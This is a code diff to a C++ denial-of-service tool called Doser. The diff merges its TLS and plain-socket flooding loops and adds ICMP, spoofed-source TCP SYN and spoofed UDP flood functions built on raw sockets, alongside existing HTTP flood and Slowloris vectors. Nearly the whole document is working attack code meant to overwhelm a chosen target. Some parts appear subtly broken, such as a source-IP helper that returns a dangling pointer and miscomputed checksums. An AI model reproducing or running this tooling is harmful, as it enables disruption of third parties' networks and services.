@@ -7,6 +7,11 @@
 #include <unistd.h>
 #include <iostream>
 #include <algorithm>
+#include <arpa/inet.h>
+#include <netinet/ip.h>
+#include <netinet/ip_icmp.h>
+#include <netinet/tcp.h>
+#include <netinet/udp.h>
 #include "Doser.h"
 
 
@@ -14,62 +19,17 @@ void Doser::attack(const int *id){
     int x, r;
     std::vector<int> sockets;
     std::vector<bool> packets;
-    for (x = 0; x < conf->CONNECTIONS; x++) {
-        sockets.push_back(0);
-        packets.push_back(false);
-    }
-    signal(SIGPIPE, &Doser::broke);
-    while(true) {
-        static std::string message;
-        for (x = 0; x < conf->CONNECTIONS; x++) {
-            if(!sockets[x]){
-                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str());
-                packets[x] = false;
-            }
-            if(conf->vector == config::NullTCP | conf->vector == config::NullUDP){
-                r = write_socket(sockets[x], "\0", 1);
-            }else{
-                std::string packet = craft_packet(packets[x]);
-                r = write_socket(sockets[x], packet.c_str(), static_cast<int>(packet.length()));
-                packets[x] = true;
-            }
-            if(conf->GetResponse){
-                read_socket(sockets[x]);
-            }
-            if(r == -1){
-                close(sockets[x]);
-                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str());
-                packets[x] = false;
-            }else{
-                message = std::string("Socket[") + std::to_string(x) + "->"
-                          + std::to_string(sockets[x]) + "] -> " + std::to_string(r);
-                logger->Log(&message, Logger::Info);
-                message = std::to_string(*id) + ": Voly Sent";
-                logger->Log(&message, Logger::Info);
-            }
-        }
-        message = std::to_string(*id) + ": Voly Sent";
-        logger->Log(&message, Logger::Info);
-        if(conf->vector == config::Slowloris){
-            usleep(10000000);
-        }else{
-            usleep(30000);
-        }
-
-    }
-}
-
-void Doser::attack_ssl(const int *id){
-    int x, r;
-    std::vector<int> sockets;
-    std::vector<bool> packets;
     std::vector<SSL_CTX *> CTXs;
     std::vector<SSL *> SSLs;
+    if(conf->UseSSL){
+        for (x = 0; x < conf->CONNECTIONS; x++) {
+            SSLs.push_back(nullptr);
+            CTXs.push_back(nullptr);
+        }
+    }
     for (x = 0; x < conf->CONNECTIONS; x++) {
         sockets.push_back(0);
         packets.push_back(false);
-        SSLs.push_back(nullptr);
-        CTXs.push_back(nullptr);
     }
     signal(SIGPIPE, &Doser::broke);
     while(true) {
@@ -77,27 +37,45 @@ void Doser::attack_ssl(const int *id){
         for (x = 0; x < conf->CONNECTIONS; x++) {
             if(!sockets[x]){
                 sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str());
-                CTXs[x] = InitCTX();
-                SSLs[x] = Apply_SSL(sockets[x], CTXs[x]);
+                if(conf->UseSSL){
+                    CTXs[x] = InitCTX();
+                    SSLs[x] = Apply_SSL(sockets[x], CTXs[x]);
+                }
                 packets[x] = false;
             }
             if(conf->vector == config::NullTCP | conf->vector == config::NullUDP){
-                r = write_socket(SSLs[x], "\0", 1);
+                if(conf->UseSSL){
+                    r = write_socket(SSLs[x], "\0", 1);
+                }else{
+                    r = write_socket(sockets[x], "\0", 1);
+                }
             }else{
                 std::string packet = craft_packet(packets[x]);
-                r = write_socket(SSLs[x], packet.c_str(), static_cast<int>(packet.length()));
+                if(conf->UseSSL){
+                    r = write_socket(SSLs[x], packet.c_str(), static_cast<int>(packet.length()));
+                }else{
+                    r = write_socket(sockets[x], packet.c_str(), static_cast<int>(packet.length()));
+                }
                 packets[x] = true;
             }
             if(conf->GetResponse){
-                read_socket(SSLs[x]);
+                if(conf->UseSSL){
+                    read_socket(SSLs[x]);
+                }else{
+                    read_socket(sockets[x]);
+                }
             }
             if(r == -1){
-                SSL_free(SSLs[x]);
-                close(sockets[x]);
-                SSL_CTX_free(CTXs[x]);
+                if(conf->UseSSL){
+                    cleanup(SSLs[x], &sockets[x], CTXs[x]);
+                }else{
+                    cleanup(&sockets[x]);
+                }
                 sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str());
-                CTXs[x] = InitCTX();
-                SSLs[x] = Apply_SSL(sockets[x], CTXs[x]);
+                if(conf->UseSSL){
+                    CTXs[x] = InitCTX();
+                    SSLs[x] = Apply_SSL(sockets[x], CTXs[x]);
+                }
                 packets[x] = false;
             }else{
                 message = std::string("Socket[") + std::to_string(x) + "->"
@@ -114,15 +92,15 @@ void Doser::attack_ssl(const int *id){
         }else{
             usleep(30000);
         }
+
     }
 }
-
 int Doser::make_socket(const char *host, const char *port) {
     struct addrinfo hints{}, *servinfo, *p;
     int sock = 0, r;
     std::string message = std::string("Connecting-> ") + host + ":" + port;
     logger->Log(&message, Logger::Info);
-    memset(&hints, 0, sizeof(hints));
+    bzero(&hints, sizeof(hints));
     hints.ai_family = AF_UNSPEC;
     switch (conf->protocol){
         case config::TCP:
@@ -202,6 +180,15 @@ void Doser::run() {
         case config::Slowloris:
             logger->Log("Attack Vector: Slowloris", Logger::Info);
             break;
+        case config::ICMPFlood:
+            logger->Log("Attack Vector: ICMP Flood", Logger::Info);
+            break;
+        case config::SpoofedTCP:
+            logger->Log("Attack Vector: Spoofed TCP", Logger::Info);
+            break;
+        case config::SpoofedUDP:
+            logger->Log("Attack Vector: Spoofed UDP", Logger::Info);
+            break;
         default:break;
     }
     if(conf->UseSSL){
@@ -218,12 +205,29 @@ void Doser::run() {
     for (int x = 0; x < conf->THREADS; x++) {
         switch (fork()){
             case 0:break;
-            default:
-                if(conf->UseSSL){
-                    attack_ssl(&x);
-                }else{
-                    attack(&x);
+            default:{
+                switch (conf->vector){
+                    case config::HTTP:
+                    case config::NullUDP:
+                    case config::NullTCP:
+                    case config::TCPFlood:
+                    case config::UDPFlood:
+                        attack(&x);
+                        break;
+                    case config::SpoofedTCP:
+                        spoofed_tcp_flood(&x);
+                        break;
+                    case config::SpoofedUDP:
+                        spoofed_udp_flood(&x);
+                        break;
+                    case config::ICMPFlood:
+                        icmp_flood(&x);
+                        break;
+                    default:
+                        attack(&x);
                 }
+            }
+
         }
         usleep(200000);
     }
@@ -243,14 +247,14 @@ std::string Doser::randomizeUserAgent(){
 void Doser::read_socket(int socket){
     char chunk[128];
     while(read(socket , chunk, 128)){
-        memset(chunk , 0 , 128);
+        bzero(chunk, sizeof(chunk));
     }
 }
 
 void Doser::read_socket(SSL *ssl) {
     char chunk[128];
     while(SSL_read(ssl , chunk, 128)){
-        memset(chunk , 0 , 128);
+        bzero(chunk, sizeof(chunk));
     }
 }
 
@@ -292,6 +296,7 @@ std::string Doser::craft_packet(bool keep_alive){
                       + " \r\nContent-Type: " + contenttype[0]
                       + " \r\nCookie: " + createStr() + "=" + createStr()
                       + " \r\nKeep-Alive: " + std::to_string(randomInt(1, 5000))
+                      + " \r\nDNT: " + std::to_string(randomInt(0, 1))
                       + "\r\n\r\n";
             return packet;
         }
@@ -318,6 +323,7 @@ std::string Doser::craft_packet(bool keep_alive){
                           + " \r\nContent-Type: " + contenttype[0]
                           + " \r\nCookie: " + createStr() + "=" + createStr()
                           + " \r\nAccept: */*"
+                          + " \r\nDNT: " + std::to_string(randomInt(0, 1))
                           + " \r\nX-a: " + std::to_string(randomInt(1, 5000))
                           + " \r\n";
             }
@@ -336,7 +342,7 @@ int Doser::randomInt(int min, int max){
 }
 
 SSL_CTX *Doser::InitCTX() {
-    const SSL_METHOD *method{SSLv3_client_method()};
+    const SSL_METHOD *method{TLSv1_client_method()};
     SSL_CTX *ctx;
     OpenSSL_add_ssl_algorithms();
     SSL_load_error_strings();
@@ -356,4 +362,257 @@ SSL *Doser::Apply_SSL(int socket, SSL_CTX *ctx){
         exit(EXIT_FAILURE);
     }
     return ssl;
+}
+
+void Doser::cleanup(const int *socket) {
+    close(*socket);
+}
+
+void Doser::cleanup(SSL *ssl, const int *socket, SSL_CTX *ctx) {
+    SSL_free(ssl);
+    close(*socket);
+    SSL_CTX_free(ctx);
+}
+
+void Doser::icmp_flood(const int *id) {
+    int s, x, on = 1;
+    char buf[400];
+    std::string message{};
+    // Structs
+    auto *ip = (struct ip *)buf;
+    auto *icmp = (struct icmphdr *)(ip + 1);
+    struct hostent *hp;
+    struct sockaddr_in dst{};
+    while(true){
+        for(x = 0;x < conf->CONNECTIONS; x++){
+            bzero(buf, sizeof(buf));
+            if((s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0){
+                logger->Log("socket() error", Logger::Error);
+                exit(EXIT_FAILURE);
+            }
+
+            if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0){
+                logger->Log("setsockopt() error", Logger::Error);
+                exit(EXIT_FAILURE);
+            }
+
+            if((hp = gethostbyname(conf->website.c_str())) == nullptr){
+                if((ip->ip_dst.s_addr = inet_addr(conf->website.c_str())) < 0){
+                    logger->Log("Can't resolve the host", Logger::Error);
+                    exit(EXIT_FAILURE);
+                }
+            }else{
+                bcopy(hp->h_addr_list[0], &ip->ip_dst.s_addr, static_cast<size_t>(hp->h_length));
+            }
+            if((ip->ip_src.s_addr = inet_addr(randomizeIP())) < 0){
+                logger->Log("Unable to set random src ip", Logger::Error);
+                exit(EXIT_FAILURE);
+            }
+
+            // IP Struct
+            ip->ip_v = 4;
+            ip->ip_hl = 5;
+            ip->ip_tos = 0;
+            ip->ip_len = htons(sizeof(buf));
+            ip->ip_id = static_cast<u_short>(randomInt(1, 1000));
+            ip->ip_off = htons(0x0);
+            ip->ip_ttl = 255;
+            ip->ip_p = 1;
+            ip->ip_sum = 0;
+
+            dst.sin_addr = ip->ip_dst;
+            dst.sin_family = AF_UNSPEC;
+
+            icmp->type = ICMP_ECHO;
+            icmp->code = static_cast<u_int8_t>(randomInt(1, 1000));
+            icmp->checksum = htons(checksum((unsigned short *) buf, (sizeof(struct ip) + sizeof(struct icmphdr))));
+            if(sendto(s, buf, sizeof(buf), 0, (struct sockaddr *)&dst, sizeof(dst)) < 0){
+                logger->Log("sendto() error", Logger::Error);
+                exit(EXIT_FAILURE);
+            }
+            close(s);
+        }
+        message = std::to_string(*id) + ": Voly Sent";
+        logger->Log(&message, Logger::Info);
+        usleep(30000);
+    }
+
+}
+
+const char *Doser::randomizeIP() {
+    std::string src{std::to_string(randomInt(1, 256))};
+    src += "."
+           + std::to_string(randomInt(1, 256))
+           + "."
+           + std::to_string(randomInt(1, 256))
+           + "."
+           + std::to_string(randomInt(1, 256));
+    return src.c_str();
+}
+
+void Doser::spoofed_tcp_flood(const int *id) {
+    int s, on = 1, x;
+    std::string message{};
+    char buf[8192];
+    auto *ip = (struct ip *)buf;
+    auto *tcp = (struct tcphdr *)(ip + 1);
+    struct hostent *hp;
+    struct sockaddr_in dst{};
+    auto s_port = randomInt(0, 65535);
+    while (true){
+        for(x = 0; x < conf->CONNECTIONS; x++){
+            bzero(buf, sizeof(buf));
+            if((s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0){
+                logger->Log("socket() error", Logger::Error);
+                exit(EXIT_FAILURE);
+            }
+
+            if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0){
+                logger->Log("setsockopt() error", Logger::Error);
+                exit(EXIT_FAILURE);
+            }
+
+            if((hp = gethostbyname(conf->website.c_str())) == nullptr){
+                if((ip->ip_dst.s_addr = inet_addr(conf->website.c_str())) < 0){
+                    logger->Log("Can't resolve the host", Logger::Error);
+                    exit(EXIT_FAILURE);
+                }
+            }else{
+                bcopy(hp->h_addr_list[0], &ip->ip_dst.s_addr, static_cast<size_t>(hp->h_length));
+            }
+            if((ip->ip_src.s_addr = inet_addr(randomizeIP())) < 0){
+                logger->Log("Unable to set random src ip", Logger::Error);
+                exit(EXIT_FAILURE);
+            }
+
+            // IP Struct
+            ip->ip_hl = 5;
+            ip->ip_v = 4;
+            ip->ip_tos = 16;
+            ip->ip_len = htons(sizeof(buf));
+            ip->ip_id = static_cast<u_short>(randomInt(1, 1000));
+            ip->ip_off = htons(0x0);
+            ip->ip_ttl = 64;
+            ip->ip_p = 6;
+            ip->ip_sum = 0;
+
+            dst.sin_addr = ip->ip_dst;
+            dst.sin_family = AF_UNSPEC;
+
+            // TCP Struct
+            tcp->source = htons(static_cast<uint16_t>(s_port));
+            tcp->dest = htons(static_cast<uint16_t>(strtol(conf->port.c_str(), nullptr, 10)));
+            tcp->seq = htonl(1);
+            tcp->ack = 0;
+            tcp->doff = 5;
+            tcp->syn = 1;
+            tcp->ack_seq = 0;
+            tcp->window = htons(32767);
+            tcp->check = 0;
+            tcp->urg_ptr = 0;
+            tcp->check = htons(checksum((unsigned short *) buf, (sizeof(struct ip) + sizeof(struct tcphdr))));
+            if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0){
+                logger->Log("setsockopt() error", Logger::Error);
+                exit(EXIT_FAILURE);
+            }
+
+            if(sendto(s, buf, ip->ip_len, 0, (sockaddr*)&dst, sizeof(struct sockaddr_in)) < 0){
+                logger->Log("sendto() error", Logger::Error);
+                exit(EXIT_FAILURE);
+            }
+            close(s);
+        }
+        message = std::to_string(*id) + ": Voly Sent";
+        logger->Log(&message, Logger::Info);
+        usleep(30000);
+    }
+
+}
+
+void Doser::spoofed_udp_flood(const int *id) {
+    int s, on = 1, x;
+    std::string message{};
+    char buf[8192];
+    auto *ip = (struct ip *)buf;
+    auto *udp = (struct udphdr *)(ip + 1);
+    struct hostent *hp;
+    struct sockaddr_in dst{};
+    auto s_port = randomInt(0, 65535);
+    while (true){
+        for(x = 0; x < conf->CONNECTIONS; x++){
+            bzero(buf, sizeof(buf));
+            if((s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0){
+                logger->Log("socket() error", Logger::Error);
+                exit(EXIT_FAILURE);
+            }
+
+            if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0){
+                logger->Log("setsockopt() error", Logger::Error);
+                exit(EXIT_FAILURE);
+            }
+
+            if((hp = gethostbyname(conf->website.c_str())) == nullptr){
+                if((ip->ip_dst.s_addr = inet_addr(conf->website.c_str())) < 0){
+                    logger->Log("Can't resolve the host", Logger::Error);
+                    exit(EXIT_FAILURE);
+                }
+            }else{
+                bcopy(hp->h_addr_list[0], &ip->ip_dst.s_addr, static_cast<size_t>(hp->h_length));
+            }
+            if((ip->ip_src.s_addr = inet_addr(randomizeIP())) < 0){
+                logger->Log("Unable to set random src ip", Logger::Error);
+                exit(EXIT_FAILURE);
+            }
+
+            // IP Struct
+            ip->ip_hl = 5;
+            ip->ip_v = 4;
+            ip->ip_tos = 16;
+            ip->ip_len = htons(sizeof(buf));
+            ip->ip_id = static_cast<u_short>(randomInt(1, 1000));
+            ip->ip_ttl = 64;
+            ip->ip_p = 17;
+            ip->ip_off = htons(0x0);
+            ip->ip_sum = 0;
+
+            dst.sin_addr = ip->ip_dst;
+            dst.sin_family = AF_UNSPEC;
+
+            // UDP Struct
+            udp->source = htons(static_cast<uint16_t>(s_port));
+            udp->dest = htons(static_cast<uint16_t>(strtol(conf->port.c_str(), nullptr, 10)));
+            udp->len = htons(sizeof(struct udphdr));
+            udp->check = htons(checksum((unsigned short *) buf, (sizeof(struct ip) + sizeof(struct udphdr))));
+
+            if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0){
+                logger->Log("setsockopt() error", Logger::Error);
+                exit(EXIT_FAILURE);
+            }
+
+            if(sendto(s, buf, ip->ip_len, 0, (sockaddr*)&dst, sizeof(struct sockaddr_in)) < 0){
+                logger->Log("sendto() error", Logger::Error);
+                exit(EXIT_FAILURE);
+            }
+            close(s);
+        }
+        message = std::to_string(*id) + ": Voly Sent";
+        logger->Log(&message, Logger::Info);
+        usleep(30000);
+    }
+}
+
+unsigned short Doser::checksum(unsigned short *buf, int len){
+
+    unsigned long sum;
+
+    for(sum=0; len>0; len--){
+        sum += *buf++;
+    }
+
+    sum = (sum >> 16) + (sum &0xffff);
+
+    sum += (sum >> 16);
+
+    return (unsigned short)(~sum);
+
 }
